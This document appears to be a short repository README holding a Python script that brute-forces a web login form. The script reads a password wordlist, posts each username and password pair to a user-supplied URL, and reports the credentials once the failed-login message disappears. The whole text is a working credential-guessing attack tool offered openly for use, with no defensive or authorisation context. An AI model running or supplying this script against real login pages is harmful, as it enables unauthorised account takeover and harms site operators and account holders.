# Login_page_Bruteforcing
#Python code to Bruteforce Login Page (Username & Password)
Bruteforcing Login page
# Importing the request Moduel from Python
import requests
# Accepting inputs from user (url,username,a password list in a txt file/path to password list file,failed to login message or text on Login Page)
url=input(f"[+] Please imput your url: \n")
username=input(f"[+] Please input the username for the account: \n")
password_file=input(f"[+] please input the list file name/ txt file: \n ")
failed_login=input(f"[+] Please input the failed login message: \n")
# opens and reads the password list in the txt file provided by user
with open(password_file, "r") as passwords:
# function to Bruteforce using list of passwords in the password txt file provided.    
    def Bruteforce(url,username):
            
            for password in passwords:
                password=password.strip()
                data={'username':username, 'password':password,'Login':'submit'}
                print(f"[+] Trying : {password}")
                response= requests.post(url,data=data)
                if failed_login in response.content.decode():
                    print(f"[+] Login unsuccessful for password:  {password}")
                    pass
                else:
                    print(f"[+] your username is :  {username}")
                    print(f"[+] Your Password is :  {password}")
                    exit()
    Bruteforce(url,username)
    print(f"Inputed Password file was unsuccessful. Password was not in the file list")
